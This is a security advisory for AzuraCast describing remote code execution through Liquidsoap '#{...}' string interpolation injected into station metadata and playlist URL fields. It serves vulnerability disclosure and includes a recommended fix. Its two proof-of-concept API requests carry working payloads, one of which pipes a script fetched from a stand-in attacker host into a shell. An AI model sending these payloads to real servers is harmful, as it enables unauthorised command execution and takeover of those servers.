# [H] AzuraCast: RCE via Liquidsoap string interpolation injection in station metadata and playlist URLs

## Summary
Severity: High
Advisory: GHSA-93fx-5qgc-wr38
CWE: CWE-94
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-09
Source: https://github.com/advisories/GHSA-93fx-5qgc-wr38
Type: github-advisory

## Affected
- Packagist: `azuracast/azuracast` — affected >=0 <0.23.4

## Details
## Summary

AzuraCast's `ConfigWriter::cleanUpString()` method fails to sanitize Liquidsoap string interpolation sequences (`#{...}`), allowing authenticated users with `StationPermissions::Media` or `StationPermissions::Profile` permissions to inject arbitrary Liquidsoap code into the generated configuration file. When the station is restarted and Liquidsoap parses the config, `#{...}` expressions are evaluated, enabling arbitrary command execution via Liquidsoap's `process.run()` function.

## Root Cause

**File:** `backend/src/Radio/Backend/Liquidsoap/ConfigWriter.php`, line ~1345

```php
public static function cleanUpString(?string $string): string
{
    return str_replace(['"', "\n", "\r"], ['\'', '', ''], $string ?? '');
}
```

This function only replaces `"` with `'` and strips newlines. It does **NOT** filter:
- `#{...}` — Liquidsoap string interpolation (evaluated as code inside double-quoted strings)
- `\` — Backslash escape character

Liquidsoap, like Ruby, evaluates `#{expression}` inside double-quoted strings. `process.run()` in Liquidsoap executes shell commands.

## Injection Points

All user-controllable fields that pass through `cleanUpString()` and are embedded in double-quoted strings in the `.liq` config:

| Field | Permission Required | Config Line |
|---|---|---|
| `playlist.remote_url` | `Media` | `input.http("...")` or `playlist("...")` |
| `station.name` | `Profile` | `name = "..."` |
| `station.description` | `Profile` | `description = "..."` |
| `station.genre` | `Profile` | `genre = "..."` |
| `station.url` | `Profile` | `url = "..."` |
| `backend_config.live_broadcast_text` | `Profile` | `settings.azuracast.live_broadcast_text := "..."` |
| `backend_config.dj_mount_point` | `Profile` | `input.harbor("...")` |

## PoC 1: Via Remote Playlist URL (Media permission)

```http
POST /api/station/1/playlists HTTP/1.1
Content-Type: application/json
Authorization: Bearer <API_KEY_WITH_MEDIA_PERMISSION>

{
    "name": "Malicious Remote",
    "source": "remote_url",
    "remote_url": "http://x#{process.run('id > /tmp/pwned')}.example.com/stream",
    "remote_type": "stream",
    "is_enabled": true
}
```

The generated `liquidsoap.liq` will contain:
```liquidsoap
mksafe(buffer(buffer=5., input.http("http://x#{process.run('id > /tmp/pwned')}.example.com/stream")))
```

When Liquidsoap parses this, `process.run('id > /tmp/pwned')` executes as the `azuracast` user.

## PoC 2: Via Station Description (Profile permission)

```http
PUT /api/station/1/profile/edit HTTP/1.1
Content-Type: application/json
Authorization: Bearer <API_KEY_WITH_PROFILE_PERMISSION>

{
    "name": "My Station",
    "description": "#{process.run('curl http://attacker.com/shell.sh | sh')}"
}
```

Generates:
```liquidsoap
description = "#{process.run('curl http://attacker.com/shell.sh | sh')}"
```

## Trigger Condition

The injection fires when the station is restarted, which happens during:
- Normal station restart by any user with `Broadcasting` permission
- System updates and maintenance
- `azuracast:radio:restart` CLI command
- Docker container restarts

## Impact

- **Severity:** Critical
- **Authentication:** Required — any station-level user with `Media` or `Profile` permission
- **Impact:** Full RCE on the AzuraCast server as the `azuracast` user
- **CWE:** CWE-94 (Code Injection)

## Recommended Fix

Update `cleanUpString()` to escape `#` and `\`:

```php
public static function cleanUpString(?string $string): string
{
    return str_replace(
        ['"', "\n", "\r", '\\', '#'],
        ['\'', '', '', '\\\\', '\\#'],
        $string ?? ''
    );
}
```

## References
- https://github.com/AzuraCast/AzuraCast/security/advisories/GHSA-93fx-5qgc-wr38
- https://github.com/AzuraCast/AzuraCast/commit/d04b5c55ce0d867bcb87f49f7082bf8edbcd360c
- https://github.com/AzuraCast/AzuraCast/commit/ff49ef4d0fa571a3661abff6d0a9546ba3ed5df5
- https://github.com/AzuraCast/AzuraCast
- https://github.com/AzuraCast/AzuraCast/releases/tag/0.23.4
